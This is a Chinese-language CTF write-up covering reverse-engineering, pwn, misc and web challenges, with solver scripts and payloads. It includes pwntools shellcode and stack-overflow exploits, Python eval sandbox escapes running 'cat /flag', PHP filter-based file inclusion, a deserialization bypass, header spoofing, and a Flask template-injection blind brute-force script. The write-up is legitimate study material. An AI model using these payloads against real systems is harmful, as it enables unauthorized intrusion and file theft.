![截图](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113193102.png)

有个很奇怪的地方，明明我已经修改了二进制文件的大小。为什么它后面还有这些0？ 按说到最后这个字母就应该结束的~

![funcitondata](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113193254.png)

![后面这些00](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113193355.png)

难道是因为文件中保存的文件长度没改？

## 8. ez_unity

本题是一个游戏，可以通过cheatengine 来对内存中的数据进行查找。

遇到的第一个困难就是，这个游戏的内存空间指令没办法看到。感觉像是有什么保护进程，在防止你读写游戏的内存空间。

打开任务管理器发现，发现一个伴随进程 `UnityCrashHandler64.exe`。结束掉这个进程，游戏并没有退出，内存空间也可见了。

所以大概应该是这个进程在对游戏的内存空间进行保护把。

### 尝试1- 找血量--失败

第一开始，我企图通过血量的变化来找到 血量的数据存放位置。但是无论如何搜索也搜索不到 3 或者 2 或者 1。

由于游戏是全屏的，所以在使用cheatengine时还要切屏。血条变化又极为迅速。所以很考验我这老年人手速了。

**然后，通过对游戏设计的猜测，我猜测，有关血量的数据很有可能会放到，跟子弹，屏障技能等这些数数据 临近的位置。**

**秉持这种猜想，我开始找子弹的存放位置。**

### 尝试2--找子弹

子弹的变化，显然比血条的变化要多。因为子弹是20。血条只有3。

很幸运，通过不断变化游戏当中子弹的数量，我们终于利用多次查找的方式，找到的子弹存放的位置。

![子弹存放位置](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221115221020.png)

之后呢，通过右键--找出是什么改写了这个地址

定位到了一些代码区域。看到了 `dec rax`

我就猜测这个地方可能是要减少子弹数量，于是乎，我把这个地方改成了 `nop`指令

![修改dec-rax 为 nop指令](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221115221527.png)

结果我很幸运的实现了，无限子弹这个功能。---可以参考子弹无限的视频。
这给我增加了极强的信心!

### 尝试3--观察在游戏过程中，子弹附近数据的变化。

终于，在不断玩游戏的过程中。我发现，换弹(R) 和 屏障(鼠标右键)。这个两个地方是存在标志位的。 如果这个标志位置1，玩家才能按下这个键。期间它是相当于一个冷却时间在里面。

所以呢，还是依靠上边的思路，右键-找出是什么改写了这个地址。

找到指令位置后，把相应标志位从 00  -- 改成 01

![修改标志位](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221115222114.png)

结果真的实现了无限屏障的功能。！！！！

可以参看视频---无限屏障。

太激动啦！！！

### 坑

- win10开启了ALSR，进程每次加载的地址都不一样。所以呢，在用CE找游戏数据的过程中，由于切屏和手速问题，经常误点击了退出。重新加载之后，导致我之前的工作全白费了！！！
- 有些游戏肯定会有保护进程，保护这个游戏的内存不被读写，所以我们需要结束掉这个进程才能看到内存空间中的反汇编代码。

之前那个CE修改游戏进程的，应该是不能保存的。或者说即使保存了，也不没达到修改源码的效果。

### 出题人给了点资料

才明白，要用dnspy，逆向之后修改c#的源代码！！

主要的函数逻辑都在/Managed/Assembly-CSarp.dll这个 dll 文件中，并且由于c#类似Js的语言特性，几乎就是可以明文随便篡改。

![修改源代码](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116085013.png)

## 9. ez_base?

这个题是一个迷宫，但它并不是按照 上下左右 这四种方式来走的。

他自己规定了8种不同的走法，

![8种不同的走法](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116105334.png)

- 首先根据字符串和create_encrypt_data函数，生成迷宫。
  - 迷宫中只有 非0 的位置可以走
- 根据用户输入的字符串，确定到底应该按照什么样的走法走
  - 走的过程中判断是否抵达边界
- 走到最后，判断一下是不是到达了出口

![迷宫](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116105720.png)

### 解题方案

- 在迷宫生成之后，通过ida `shift+e` 功能将其数据导出
- 然后编写走迷宫的程序，将走法记录下来
- 根据走法产生的字符串生成flag--在md5

这里必须要强调一下，数据结构没学好的弊端了。

**走迷宫需要设计栈或者是图的结构，采用深度优先遍历或者广度优先遍历的方式把迷宫走完。**

像我这种，还采用随机走法的方式，浪费了很多计算资源，甚至到最后也算不出来。

还有，代码是借鉴了网上一位大神的版本，具体路径给忘了。修改别人代码之后，有问题记得先调试一下，别搞这种一直无限循环的低级错误！

> 代码里面的迷宫，是我处理之后的，就是把 (0,0)位置改为0，然后呢，把非零的位置改为 0 ，把 0 的位置 改为 1。
> 因为迷宫算法中，只有0的位置才能走。1就相当于是个墙。

```python
from pprint import pprint
maze = [                                    # 迷宫地图
[0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0],
[1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1],
[1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0],
[0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1],
[1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0],
[1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0],
[1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1],
[1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1],
[0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1],
[1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1],
[1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1],
[1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1],
[1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1],
[1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1],
[0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1],
[1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1],
[1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1],
[1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0],
[1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0],
[1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1],
[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1],
[1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1],
[1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1],
[1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1],
[1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1],
[0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1],
[1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1],
[1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1],
[1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1],
[0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0],
]
directions = [                              # 使用列表设计走迷宫方向
    lambda x, y: (x-1, y+2),        # 1
    lambda x, y: (x-2, y+1),        # 2
    lambda x, y: (x-2, y-1),        # 3
    lambda x, y: (x-1, y-2),        # 4
    lambda x, y: (x+1, y+2),        # 5
    lambda x, y: (x+2, y+1),        # 6
    lambda x, y: (x+2, y-1),        # 7
    lambda x, y: (x+1, y-2),        # 8

]

true_flag = []

def maze_solve(x, y, goal_x, goal_y):
    ''' 解迷宫程序 x, y是迷宫入口, goal_x, goal_y是迷宫出口'''
    maze[x][y] = 2
    stack = []                              # 建立路径栈
    stack.append((x, y))                    # 将路径push入栈
    print('迷宫开始')
    while (len(stack) > 0):
        cur = stack[-1]                     # 目前位置
        if cur[0] == goal_x and cur[1] == goal_y:
            print('抵达出口')
            return True                     # 抵达出口返回True
        for kind,dir in enumerate(directions) :              # 依上, 下, 左, 右优先次序走此迷宫
            next = dir(cur[0], cur[1])
            if next[1] <= 29 and next[0] <= 29 and next[1] >=0 and next[0] >= 0:
                if maze[next[0]][next[1]] == 0:  # 如果是通道可以走
                    stack.append(next)
                    true_flag.append(str(kind))
                    print(next)
                    maze[next[0]][next[1]] = 2  # 用2标记走过的路
                    break
        else:                               # 如果进入死路, 则回溯
            maze[cur[0]][cur[1]] = 3        # 标记死路
            stack.pop()                     # 回溯
            true_flag.pop()
    else:
        print("没有路径")


maze_solve(0, 0, 29, 29)
pprint(maze)                                # 跳行显示元素



print("".join(true_flag))


# flag = []
# for x,item in enumerate(maze):
#     for y,item2 in enumerate(item):
#         if item2 == 2:
#             flag.append(str(x))
#             flag.append(str(y))

# print("".join(flag))
```

## 10. ez_flower

此题是跟异常处理机制相关的逆向问题。

ida反汇编之后，会找到一个函数，但是这个函数会触发 `除数为零`  的异常

![异常触发函数](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116215433.png)

触发异常之后，要把信号传递给进程。然后就是跟着ida一步一步的调试啦。

![触发异常](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116215636.png)

![传递给进程](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221116215704.png)

这里要注意，第二个异常处理函数才是我们要找的函数。找到之后，它利用了一些栈结构去调用真正可以计算flag的函数。

这个函数并不复杂，就是简单的异或运算。但是由于反汇编出来的东西不是很友好，所以要一句句的看汇编代码并结合动态调试，有不懂的可以根据实际情况猜一下。

```python
data = [ 's',  'b',  'w',  '`',  'p',  'c',  '}',
  'O',
  't',
  'p',
  '\\',
  'p',
  '`',
  'g',
  'm',
  '^',
  'k',
  'p',
  '[',
  'l',
  'h',
  '_',
  't',
  'p',
  'd',
  'a',
  'k',
  'r',
  '_',
  'o',
  'g',
  'f',
  '`',
  'Z',
  'i',
  'f',
  '^',
  'p',
  'f',
  'r',
  '`',
  't',
  's',
  'd',
  ']',
  's',
  'h',
  'd',
  127, # delelte
  'e',
  's',
  'q',
  '~',
]

k = 0
flag = []
for i in range(7):
    for j in range(7):
        if isinstance(data[k], str):
           flag.append( chr( ord(data[k]) ^ j))
        else:
            flag.append(chr(data[k]^j))
        k = k+1



flag.append( chr( ord(data[k]) ^ 0))
k = k+1
flag.append( chr( ord(data[k]) ^ 1))
k = k+1
flag.append( chr( ord(data[k]) ^ 2))
k = k+1
flag.append( chr( ord(data[k]) ^ 3))
k = k+1


print("".join(flag))
```

### windows异常处理函数的机制---需要总结哦

# PWN

### 1. 2048_game

上下左右随机按的，直接按到对应的分数，然后就会给相应的flag

### 2. ret2shellcode

什么保护也没有！

这个就是把shellcode写入到段里面。然后再利用栈溢出跳过去。

但是我不明白的一点是，为什么在本地显示这个段实际上是没有执行权限的。本地调试也打不通。

可是拿服务器一试就行，真的很奇怪哎！

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

sh = process('./ret2shellcode')

#gdb.attach(sh, 'b* main')

#sh = remote("114.117.187.56",10003)
target = 0x00000000004040A0

shellcode = asm(shellcraft.sh())
#print(len(shellcode))
#shellcode.ljust(112,b'A')
nop = asm('nop')
sh.recvline() # 接收一行输出
sh.sendline(shellcode)


sh.recvline() # 接收一行输出
crash = ("A"*40).encode()+p64(target)
print(crash)
sh.sendline(crash)
# sh.recv()
# payload = shellcode.ljust(196,b'A') + p64(target)
# print(payload)
#payload = shellcode + ("A"*(196-44)).encode() + p64(target)
sh.interactive()
```

### 3. ret2text

什么保护也没有！

这个就是直接跳到system的地址就行

```python
from pwn import *

from pwn import *
c = remote("114.117.187.56", 10002)
c.sendline("AAAA" * 10 + p32(0x08049256).decode('unicode_escape'))
c.interactive()
```

### 4. test_your_nc

```bash
nc xxx
ls
cat flag
flag{Nc_1s-Tn3_F1r5t_sT3p_0f_pvvn!}
```

### 5. [easy]learning_python

eval执行
print(eval("__import__('os').listdir(r'/')"))
发现flag目录
查看flag
print(eval("__import__('os').system('cat /flag')"))。

![1](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123105847.png)

### 6. learning_python2

发现对import关键字进行了过滤。
print(eval("__im"+"port__('os').listdir(r'/')"))
print(eval("__im"+"port__('os').system('cat /flag')"))

![1](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123105919.png)

```python
1.	print(eval("__im"+"port__('os').listdir(r'/')"))  
2.	print(eval("__im"+"port__('os').system('cat /flag')"))
```

### 7. learning_python3

print(eval("().__class__.__bases__[0].__subclasses__()[99].get_data(0,'/flag')"))  测试找到frozen_importlib_external.FileLoader为列表中第99个 编码绕过。

![2](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123110006.png)

# Misc

### 小宇的通勤

2号线 和 8 号线是重叠的，只有深圳的

然后2号线、8号线是重叠的，一个一个试就行。最后是岗厦北

![地铁图片](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221121232033.png)

# Web

### 1. Web_Include

要用到php的封装协议，在文件后缀添加  `?file=php://filter/read=convert.base64-encode/resource=flag.php`。首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，`/read=convert.base64-encode/`表示读取的方式是base64编码后，`resource=flag.php`表示目标文件为flag.php。

![1](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095422.png)

![2](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095440.png)

### 2. Check_in

php语言 对sha1的验证存在漏洞，改成数组则可 均为false。`http://114.117.187.56:11000/?file=php://filter/read=convert.base64-encode/resource=flag.php&a[]=a；post_data = {'b[]': 'b'} `

![1](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095515.png)

```python
1.	import requests  
2.	import random  
3.	  
4.	# 定义一个请求头列表，每次调用requests函数时随机从列表中选取header，避免被封。  
5.	headers_list = [{  
6.	    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3870.400 QQBrowser/10.8.4405.400"  
7.	}, {  
8.	    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60"  
9.	}, {  
10.	    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36"  
11.	}, {  
12.	    "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"  
13.	}, {  
14.	    "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0"  
15.	}, {  
16.	    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36"  
17.	}, {  
18.	    "User-Agent": "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"  
19.	}, {  
20.	    "User-Agent": "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"  
21.	}, {  
22.	    "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"  
23.	}]  
24.	  
25.	host = "http://114.117.187.56:11000/?file=php://filter/read=convert.base64-encode/resource=flag.php&a[]=a"  
26.	endpoint = "post"  
27.	url = ''.join([host, endpoint])  
28.	  
29.	data = {'b[]': 'b'}  
30.	headers = random.choice(headers_list)  
31.	r = requests.post(url, data=data, headers=headers)  
32.	# response = r.json()  
33.	print(r.text)
```

### 3. 可爱的探针

访问 `http://117.50.188.49:1145/tz.php?act=phpinfo `全局搜索。

![1](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095710.png)

### 4. baby_ip

在源码注释中发现密码，将其解码的到字符密码，修改源码中的maxlength，接着提示本地访问，使用burpsite工具抓包，并添加请求头 `X-Forwarded-For: 127.0.0.1`进行本地访问。

![1](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095744.png)

![2](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095755.png)

![3](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095809.png)

![4](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095823.png)

![5](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095833.png)

![6](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095847.png)

![7](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123095902.png)

### 5. 真ikun进

直接在 network 全局搜索 flag，测试代码 并base64解密即可。

![1](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123100035.png)

根据这里来构建base64编码字符串，然后解密：

![2](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123100050.png)

### 6. [easy]豪豪扫描器:

直接notepad 全局检索关键字 ctf。

![1](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123100119.png)

### 7. unserialize

需要绕过_wakeup()方法。`http://114.117.187.56:11008/?p=O:1:%22A%22:2:{s:3:%22kfc%22;s:7:%22v_me_50%22;}` 原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。

![1](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123100156.png)

### 8. Easy_Flask

构造payload
`{%if (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].__name__) == 'FileLoader' %}1{% endif %}`
遍历%d
`pay_load = "{%" + "if 'FileLoader' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[%d].__name__)" %i + "%}" + "1" + "{%" +  "endif" + "%}"`
得出 d=118时，返回了OK 。可以利用FileLoader

利用FileLoader里面的getdata
`{%if (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[0]) %}1{% endif %}`

遍历128个字符 盲注 测试 如果输出了ok，则拼接到flag字符串中，遍历50次，得到最终flag
`pay_load = "{%" + "if '%s' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[%d])" % (str1, i) + "%}" + "1" + "{%" + "endif" + "%}"`

`例如：http://114.117.187.56:11003/view?name={%if '5' == (''['__cla''ss__']['__ba''ses__'][0][&#39;__subcl''asses__&#39;]()[118].get_data(0,'/flag').decode('utf-8','ignore')[28])%}1{%endif%}`
Ok

scuctf{1eb75f13ba362c3c90030585a85435f4}。

![1](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221123110110.png)

```python
1.	import requests  
2.	flag = ""  
3.	a = "Ok"        #成功后的显示  
4.	base_url = "http://114.117.187.56:11003/view?name=" #题目网址  
5.	for i in range(50, 120):                   #两个循环  
6.	        # pay_load = "{%" + "if \"%s\" == str(('con'~'fig'.Flag[%d]))" % (str1, i) + "%}" + "1" + "{%" +  "endif" + "%}"  
7.	        pay_load = "{%" + "if 'FileLoader' == (''['__cla''ss__']['__ba''ses__'][0]['__subcl''asses__']()[%d].__name__)" %i + "%}" + "1" + "{%" +  "endif" + "%}"  
8.	        # print(pay_load)  
9.	        url = base_url + pay_load  
10.	        print(url)  
11.	        r = requests.get(url)  
12.	        b = r.text  
13.	        print(b)  
14.	        if a in b:                             #如果a是在b里面则记入到flag里面  
15.	            print("\n\n")  
16.	            print(url)  
17.	            break  
18.	  
19.	# {%if (''['__cla''ss__']['__ba''ses__'][0]['__subcl''asses__']()[99].__name__) == 'FileLoader' %}1{% endif %}
```

```python
1.	import requests  
2.	flag = ""  
3.	a = "Ok"        #成功后的显示  
4.	base_url = "http://114.117.187.56:11003/view?name=" #题目网址  
5.	for i in range(50):  
6.	    for j in range(1, 128):                     #两个循环  
7.	        str1 = chr(j)  
8.	        # print(str1)  
9.	        pay_load = "{%" + "if '%s' == (''['__cla''ss__']['__ba''ses__'][0]['__subcl''asses__']()[118].get_data(0,'/flag').decode('utf-8','ignore')[%d])" % (str1, i) + "%}" + "1" + "{%" + "endif" + "%}"  
10.	        # print(pay_load)  
11.	        url = base_url + pay_load  
12.	        # print(url)  
13.	        r = requests.get(url)  
14.	        b = r.text  
15.	        # print(b)  
16.	        if a in b:                             #如果a是在b里面则记入到flag里面  
17.	            print("\n\n")  
18.	            flag += chr(j)  
19.	            print(flag)  
20.	            break  
21.	print("最终的flag！")  
22.	print(flag)
```
